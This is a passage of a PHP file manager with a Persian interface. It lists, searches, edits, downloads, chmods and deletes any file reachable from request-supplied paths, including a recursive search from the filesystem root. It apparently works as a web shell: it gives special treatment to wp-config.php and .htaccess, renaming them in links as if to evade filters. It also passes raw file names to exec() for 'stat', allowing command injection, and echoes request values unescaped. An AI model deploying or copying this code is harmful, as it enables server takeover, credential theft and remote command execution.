                    echo "<div class='modal fade' id='newfolder'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>new folder</h4></div><div class='modal-body'>";
                    echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='name'>نام</label><input class='form-control' id='name' name='name'></div></div><input type='hidden' class='form-control' id='dir' name='dir' value='" . $req . $ddd . "'><input type='hidden' name='command' value='mkf'><input type='hidden' name='type' value='2'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>ارسال</button></div></div></form>";
                    echo "</div></div></div></div>";

                    echo "<div class='modal fade' id='newfile'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>new file</h4></div><div class='modal-body'>";
                    echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='name'>نام</label><input class='form-control' id='name' name='name'></div></div><input type='hidden' class='form-control' id='dir' name='dir' value='" . $req . $ddd . "'><input type='hidden' name='command' value='mkf'><input type='hidden' name='type' value='1'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>ارسال</button></div></div></form>";

                    echo "</div></div></div></div>";
                }
                $dir = $req == "" ? "" : "/";
                if (is_dir($dirtohome . $req . $dir . $key)) {
                    if ($val > 1) {
                        echo "<div class='col-12 p-0 py-1 btn-group' id='leftall'><a class='btn btn-success col text-center' id='leftall' href='?command=dirlist&dirlist=" . $req . $dir . $key . "'>" . $key . "</a><button class='btn btn-secondary text-center dropdown-toggle' data-toggle='dropdown'>setting</button><div class='dropdown-menu'>";


                        echo "<a class='text-center dropdown-item' href='?command=dirlist&dirlist=" . $req . $dir . $key . "'>open</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#copyfolder" . $val . "'>copy</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#movefolder" . $val . "'>move</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#renamefolder" . $val . "'>rename</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#compressfolder" . $val . "'>compress</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#chmodfolder" . $val . "'>chmod</a>";
                        echo "<a class='text-center dropdown-item' target='_blank' href='?command=getchmod&dirlist=" . $req . $dir . $key . "'>getchmod</a>";
                        echo "<a class='text-center dropdown-item' href='?command=remove&dirhide=" . $dirtohome . $req . $dir . $key . "&re=2&dirlist=" . $req . "' onclick=\"return confirm('فایل " . $key . " حذف شود؟')\">remove</a>";


                        echo "</div></div>";


                        echo "<div class='modal fade' id='copyfolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>copy folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dircopy' value='" . $req . $dir . $key . "'><input type='hidden' name='key' value='" . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>کپی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='movefolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>move folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dirmove' value='" . $req . $dir . $key . "'><input type='hidden' name='key' value='" . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>انتقال</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='renamefolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>rename folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>نام</label><input class='form-control' id='to' name='to' value='" . $key2 . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='from' value='" . $key2 . "'><input type='hidden' name='dirrename' value='" . $req . $dir . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>تغییر نام</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='compressfolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>compress folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='ziper'><input type='hidden' name='dir' value='" . $req . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>فشرده سازی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='chmodfolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>chmod folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . substr(sprintf('%o', fileperms($dirtohome . $req . $dir . $key)), -4) . "'></div></div><input type='hidden' name='command' value='chmod'><input type='hidden' name='dir' value='" . $req . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>ارسال</button></div></div></form>";
                        echo "</div></div></div></div>";
                    }
                }
            }
            foreach ($files1 as $val => $key) {
                $dir = $req == "" ? "" : "/";
                if (!is_dir($dirtohome . $req . $dir . $key)) {
                    if ($val > 1) {
                        $key2 = $key;
                        if ($key == ".htaccess") {
                            $key = "dathtaccess";
                        } elseif ($key == "wp-config.php") {
                            $key = "wpconfig.php";
                        }
                        $extract = 0;
                        echo "<div class='col-12 p-0 py-1 btn-group' id='leftall'><a class='btn btn-info col-12 text-center' id='leftall' target='_blank' href='?command=read&dirlist=" . $req . $dir . $key . "'>" . $key2 . "</a><button class='btn btn-secondary text-center dropdown-toggle' id='left' data-toggle='dropdown'>setting</button><div class='dropdown-menu'>";


                        echo "<a class='text-center dropdown-item' target='_blank' href='?command=read&dirlist=" . $req . $dir . $key . "'>edit</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#copyfile" . $val . "'>copy</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#movefile" . $val . "'>move</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#renamefile" . $val . "'>rename</a>";
                        if (@end(explode(".", $key2)) == "zip") {
                            echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#extract" . $val . "'>extract</a>";
                            $extract = $val;
                        }
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#compressfile" . $val . "'>compress</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#chmodfile" . $val . "'>chmod</a>";
                        echo "<a class='text-center dropdown-item' target='_blank' href='?command=getchmod&dirlist=" . $req . $dir . $key . "'>getchmod</a>";
                        echo "<a class='text-center dropdown-item' href='?command=downloader&dir=" . $req . $dir . $key . "'>download</a>";
                        echo "<a class='text-center dropdown-item' href='?command=remove&dirhide=" . $dirtohome . $req . $dir . $key . "&re=2&dirlist=" . $req . "' onclick=\"return confirm('فایل " . $key2 . " حذف شود؟')\">remove</a>";


                        echo "</div></div>";


                        echo "<div class='modal fade' id='copyfile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>copy file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dircopy' value='" . $req . $dir . $key . "'><input type='hidden' name='key' value='" . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>کپی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='movefile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>move file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dirmove' value='" . $req . $dir . $key . "'><input type='hidden' name='key' value='" . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>انتقال</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='renamefile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>rename file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>نام</label><input class='form-control' id='to' name='to' value='" . $key2 . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='from' value='" . $key2 . "'><input type='hidden' name='dirrename' value='" . $req . $dir . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>تغییر نام</button></div></div></form>";
                        echo "</div></div></div></div>";

                        if ($extract != 0) {
                            echo "<div class='modal fade' id='extract" . $extract . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>extract</h4></div><div class='modal-body'>";
                            echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='unziper'><input type='hidden' name='dir' value='" . $req . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>استخراج</button></div></div></form>";
                            echo "</div></div></div></div>";
                        }

                        echo "<div class='modal fade' id='compressfile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>compress file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $req . "'></div></div><input type='hidden' name='command' value='ziper'><input type='hidden' name='dir' value='" . $req . $dir . $key . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>فشرده سازی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='chmodfile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>chmod file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . substr(sprintf('%o', fileperms($dirtohome . $req . $dir . $key2)), -4) . "'></div></div><input type='hidden' name='command' value='chmod'><input type='hidden' name='dir' value='" . $req . $dir . $key2 . "'><input type='hidden' name='re' value='?command=dirlist&dirlist=" . $req . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>ارسال</button></div></div></form>";
                        echo "</div></div></div></div>";
                    }
                }
            }
        } elseif (@$_REQUEST['command'] == "alldirlist") {
            if (isset($_REQUEST['dirlist'])) {
                function dirToArray($dir)
                {
                    $result = array();
                    $cdir = scandir($dir);
                    foreach ($cdir as $key => $value) {
                        if (!in_array($value, array(".", ".."))) {
                            if (is_dir($dir . DIRECTORY_SEPARATOR . $value)) {
                                $result[$value] = dirToArray($dir . DIRECTORY_SEPARATOR . $value);
                            } else {
                                $result[] = $value;
                            }
                        }
                    }
                    return $result;
                }
                $ret = dirToArray($_REQUEST['dirlist']);
                echo "<pre>";
                print_r($ret);
                echo "</pre>";
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-12">
                        <label for="dirlist">شروع دایرکتوری</label>
                        <input class="form-control" id="dirlist" name="dirlist">
                    </div>
                </div>
                <input type="hidden" name="command" value="alldirlist">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "finder") {
            if (isset($_REQUEST['dirlist'])) {
                if (@end(explode("/", $_REQUEST['name'])) == "dathtaccess") {
                    @$_REQUEST['name'] = str_replace(end(explode("/", $_REQUEST['name'])), ".htaccess", $_REQUEST['name']);
                } elseif (@end(explode("/", $_REQUEST['name'])) == "wpconfig.php" && !file_exists($dirtohome . $_REQUEST['name'])) {
                    @$_REQUEST['name'] = str_replace(end(explode("/", $_REQUEST['name'])), "wp-config.php", $_REQUEST['name']);
                }
                function sdirToArray($dir, $find)
                {
                    @$enddir = end(explode("/", $dir)) == "" ? "" : "/";
                    foreach (glob("/" . $dir . $enddir . $find, GLOB_BRACE) as $filename) {
                        $str = str_split($filename);
                        unset($str[0]);
                        $filename = "";
                        foreach ($str as $val) {
                            $filename .= $val;
                        }
                        $GLOBALS['find'][] = $filename;
                    }
                    $cdir = scandir("/" . $dir);
                    foreach ($cdir as $key => $value) {
                        if (!in_array($value, array(".", ".."))) {
                            if (is_dir("/" . $dir . $enddir . $value)) {
                                sdirToArray($dir . $enddir . $value, $find);
                            }
                        }
                    }
                }
                sdirToArray($_REQUEST['dirlist'], $_REQUEST['name']);
                foreach ($find as $val => $key) {
                    if (is_dir($dirtohome . $key)) {
                        echo "<div class='col-12 p-0 py-1 btn-group' id='leftall'><a class='btn btn-success col text-center' id='leftall' href='?command=dirlist&dirlist=" . $key . "' target='_blank'>" . $key . "</a><button class='btn btn-secondary text-center dropdown-toggle' data-toggle='dropdown'>setting</button><div class='dropdown-menu'>";


                        echo "<a class='text-center dropdown-item' href='?command=dirlist&dirlist=" . $key . "'>open</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#copyfolder" . $val . "'>copy</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#movefolder" . $val . "'>move</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#renamefolder" . $val . "'>rename</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#compressfolder" . $val . "'>compress</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#chmodfolder" . $val . "'>chmod</a>";
                        echo "<a class='text-center dropdown-item' target='_blank' href='?command=getchmod&dirlist=" . $key . "'>getchmod</a>";
                        echo "<a class='text-center dropdown-item' href='?command=remove&dirhide=" . $dirtohome . $key . "&re=3&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "' onclick=\"return confirm('فایل " . $_REQUEST['name'] . " حذف شود؟')\">remove</a>";


                        echo "</div></div>";


                        echo "<div class='modal fade' id='copyfolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>copy folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $key . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dircopy' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>کپی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='movefolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>move folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $key . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dirmove' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>انتقال</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='renamefolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>rename folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>نام</label><input class='form-control' id='to' name='to' value='" . $key . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='from' value='" . $key . "'><input type='hidden' name='dirrename' value='" . $req . $dir . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>تغییر نام</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='compressfolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>compress folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $_REQUEST['dirlist'] . "'></div></div><input type='hidden' name='command' value='ziper'><input type='hidden' name='dir' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>فشرده سازی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='chmodfolder" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>chmod folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . substr(sprintf('%o', fileperms($dirtohome . $key)), -4) . "'></div></div><input type='hidden' name='command' value='chmod'><input type='hidden' name='dir' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>ارسال</button></div></div></form>";
                        echo "</div></div></div></div>";
                    }
                }
                foreach ($find as $val => $key) {
                    if (!is_dir($dirtohome . $key)) {
                        $key2 = $key;
                        $key3 = @end(explode("/", $key));
                        if (@end(explode("/", $key)) == ".htaccess") {
                            @$key = str_replace(end(explode("/", $key)), "dathtaccess", $key);
                        } elseif (@end(explode("/", $key)) == "wp-config.php") {
                            @$key = str_replace(end(explode("/", $key)), "wpconfig.php", $key);
                        }
                        $extract = 0;
                        echo "<div class='col-12 p-0 py-1 btn-group' id='leftall'><a class='btn btn-info col-12 text-center' id='leftall' target='_blank' href='?command=read&dirlist=" . $key . "'>" . $key2 . "</a><button class='btn btn-secondary text-center dropdown-toggle' id='left' data-toggle='dropdown'>setting</button><div class='dropdown-menu'>";


                        echo "<a class='text-center dropdown-item' target='_blank' href='?command=read&dirlist=" . $key . "'>edit</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#copyfile" . $val . "'>copy</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#movefile" . $val . "'>move</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#renamefile" . $val . "'>rename</a>";
                        if (@end(explode(".", $key2)) == "zip") {
                            echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#extract" . $val . "'>extract</a>";
                            $extract = $val;
                        }
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#compressfile" . $val . "'>compress</a>";
                        echo "<a class='text-center dropdown-item' data-toggle='modal' data-target='#chmodfile" . $val . "'>chmod</a>";
                        echo "<a class='text-center dropdown-item' target='_blank' href='?command=getchmod&dirlist=" . $key . "'>getchmod</a>";
                        echo "<a class='text-center dropdown-item' href='?command=downloader&dir=" . $key . "'>download</a>";
                        echo "<a class='text-center dropdown-item' href='?command=remove&dirhide=" . $dirtohome . $key . "&re=3&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "' onclick=\"return confirm('فایل " . $_REQUEST['name'] . " حذف شود؟')\">remove</a>";


                        echo "</div></div>";


                        echo "<div class='modal fade' id='copyfile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>copy folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $key . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dircopy' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>کپی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='movefile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>move folder</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $key . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='dirmove' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>انتقال</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='renamefile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>rename file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>نام</label><input class='form-control' id='to' name='to' value='" . $key2 . "'></div></div><input type='hidden' name='command' value='copy'><input type='hidden' name='from' value='" . $key2 . "'><input type='hidden' name='dirrename' value=''><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>تغییر نام</button></div></div></form>";
                        echo "</div></div></div></div>";

                        if ($extract != 0) {
                            echo "<div class='modal fade' id='extract" . $extract . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>extract</h4></div><div class='modal-body'>";
                            echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $_REQUEST['dirlist'] . "'></div></div><input type='hidden' name='command' value='unziper'><input type='hidden' name='dir' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>استخراج</button></div></div></form>";
                            echo "</div></div></div></div>";
                        }

                        echo "<div class='modal fade' id='compressfile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>compress file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . $_REQUEST['dirlist'] . "'></div></div><input type='hidden' name='command' value='ziper'><input type='hidden' name='dir' value='" . $key . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>فشرده سازی</button></div></div></form>";
                        echo "</div></div></div></div>";

                        echo "<div class='modal fade' id='chmodfile" . $val . "'><div class='modal-dialog'><div class='modal-content'><div class='modal-header' id='left'><h4 class='modal-title'>chmod file</h4></div><div class='modal-body'>";
                        echo "<form class='form' method='post' enctype='multipart/form-data'><div class='row form-group'><div class='col-12'><label for='to'>به</label><input class='form-control' id='to' name='to' value='" . substr(sprintf('%o', fileperms($dirtohome . $key2)), -4) . "'></div></div><input type='hidden' name='command' value='chmod'><input type='hidden' name='dir' value='" . $key2 . "'><input type='hidden' name='re' value='?command=finder&dirlist=" . $_REQUEST['dirlist'] . "&name=" . $_REQUEST['name'] . "'><div class='row form-group'><div class='col-12'><button class='btn btn-primary'>ارسال</button></div></div></form>";
                        echo "</div></div></div></div>";
                    }
                }
            }
        ?>
            <form class="form" method="post" enctype="multipart/form-data">
                <div class="row form-group">
                    <div class="col-8">
                        <label for="dirlist">شروع گشتن از دایرکتوری</label>
                        <input class="form-control" id="dirlist" name="dirlist" value="<?php echo $dirhelp ?>">
                    </div>
                    <div class="col-4">
                        <label for="name">نام فایل</label>
                        <input class="form-control" id="name" name="name">
                    </div>
                </div>
                <input type="hidden" name="command" value="finder">
                <div class="row form-group">
                    <div class="col-12">
                        <button class="btn btn-primary">ارسال</button>
                    </div>
                </div>
            </form>
        <?php
        } elseif (@$_REQUEST['command'] == "downloader") {
            if (isset($_REQUEST['dir'])) {
                class mwsDownload
                {
                    private function mws_mime_type($file)
                    {
                        return mime_content_type($file);
                    }
                    private function mws_folder_exist($folder)
                    {
                        $path = realpath($folder);
                        if ($path !== false and is_dir($path)) {
                            return $path;
                        }
                        return false;
                    }
                    private function mws_file_size($file, $byte)
                    {
                        global $windows_service;

                        if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') {
                            if (class_exists("COM")) {
                                $fsobj = new COM('Scripting.FileSystemObject');
                                $f = $fsobj->GetFile(realpath($file));
                                $size = $f->Size;
                            } else {
                                $size = trim(@exec("for %F in (\"" . $file . "\") do @echo %~zF"));
                            }
                        } elseif (PHP_OS == 'Darwin') {
                            $size = trim(@exec("stat -f %z " . $file));
                        } else {
                            $size = trim(@exec("stat -c %s " . $file));
                        }
                        if (filesize($file) > $size) {
                            $size = filesize($file);
                        }
                        if (!is_numeric($size)) {
                            $size = filesize($file);
                        }
                        if ($this->mws_folder_exist($file) || is_dir($file)) {
                            return 0;
                        } else {
                            if ($size > 0) {
                                if ($byte === true) {
                                    return $size;
                                } else {
                                    return ($size > 0 && round(($size / 1048576)) == 0) ? 1 : round(($size / 1048576));
                                }
                            } else {
                                return 1;
                            }
                        }
                    }
                    public function download($data_file)
                    {
                        $data_size = $this->mws_file_size($data_file, true);
                        $mime = $this->mws_mime_type($data_file);
                        $filename = basename($data_file);
                        if (isset($_SERVER['HTTP_RANGE']) || isset($HTTP_SERVER_VARS['HTTP_RANGE'])) {
                            $ranges_str = (isset($_SERVER['HTTP_RANGE'])) ? $_SERVER['HTTP_RANGE'] : $HTTP_SERVER_VARS['HTTP_RANGE'];
                            $ranges_arr = explode('-', substr($ranges_str, strlen('bytes=')));
                            if ((intval($ranges_arr[0]) >= intval($ranges_arr[1]) && $ranges_arr[1] != "" && $ranges_arr[0] != "") || ($ranges_arr[1] == "" && $ranges_arr[0] == "")) {
                                $ranges_arr[0] = 0;
                                $ranges_arr[1] = $data_size - 1;
                            }
                        } else {
                            $ranges_arr[0] = 0;
                            $ranges_arr[1] = $data_size - 1;
                        }
                        $file     = fopen($data_file, 'rb');
                        $start     = $stop = 0;
                        if ($ranges_arr[0] === "") {
                            $stop = $data_size - 1;
                            $start = $data_size - intval($ranges_arr[1]);
                        } elseif ($ranges_arr[1] === "") {
                            $start = intval($ranges_arr[0]);
                            $stop = $data_size - 1;
                        } else {
                            $stop = intval($ranges_arr[1]);
                            $start = intval($ranges_arr[0]);
                        }
                        fseek($file, $start, SEEK_SET);
                        $start = ftell($file);
                        fseek($file, $stop, SEEK_SET);
                        $stop = ftell($file);
                        $data_len = $stop - $start;
                        if (isset($_SERVER['HTTP_RANGE']) || isset($HTTP_SERVER_VARS['HTTP_RANGE'])) {
                            header('HTTP/1.0 206 Partial Content');
                            header('Status: 206 Partial Content');
                        }
                        header('Accept-Ranges: bytes');
                        header('Content-type: ' . $mime);
                        header('Content-Disposition: attachment; filename="' . $filename . '"');
                        header("Content-Range: bytes $start-$stop/" . $data_size);
                        header("Content-Length: " . ($data_len + 1));
                        fseek($file, $start, SEEK_SET);
                        $bufsize = 2048000;
                        ignore_user_abort(true);
                        @set_time_limit(0);
                        while (!(connection_aborted() || connection_status() == 1) && $data_len > 0) {
                            echo fread($file, $bufsize);
                            $data_len -= $bufsize;
                            flush();
                        }
                        fclose($file);
                    }
                }
                if (@end(explode("/", $_REQUEST['dir'])) == "dathtaccess") {
                    @$_REQUEST['dir'] = str_replace(end(explode("/", $_REQUEST['dir'])), ".htaccess", $_REQUEST['dir']);
                }
                $file = $dirtohome . $_REQUEST['dir'];
                $mws = new mwsDownload();
                $mws->download($file);
                if (@$_REQUEST['del'] == 1) {
                    unlink($file);
